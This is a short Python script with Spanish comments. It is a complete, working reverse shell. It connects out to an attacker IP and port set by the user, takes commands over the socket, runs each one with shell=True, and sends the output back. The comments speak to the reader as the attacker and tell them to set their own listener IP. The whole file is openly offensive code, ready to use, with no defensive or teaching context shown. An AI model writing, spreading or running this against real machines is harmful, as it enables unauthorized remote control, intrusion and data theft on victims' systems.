import socket
import subprocess
import os

# Configuración del atacante
IP_ATACANTE = "192.168.1.100"  # Cambia esto por la IP de tu máquina atacante
PUERTO = 4444  # El puerto en el que escucharás la conexión

# Crear el socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((IP_ATACANTE, PUERTO))
    s.send(b"Conexión establecida\n")

    while True:
        # Recibir comando
        comando = s.recv(1024).decode().strip()

        if comando.lower() == "exit":
            break

        # Cambiar directorio si es necesario
        if comando.startswith("cd "):
            try:
                os.chdir(comando[3:])
                s.send(b"Directorio cambiado\n")
            except FileNotFoundError:
                s.send(b"Directorio no encontrado\n")
            continue

        # Ejecutar comando
        resultado = subprocess.run(comando, shell=True, capture_output=True, text=True)
        salida = resultado.stdout + resultado.stderr
        s.send(salida.encode() if salida else b"Comando ejecutado\n")

except Exception as e:
    s.send(f"Error: {str(e)}\n".encode())

finally:
    s.close()
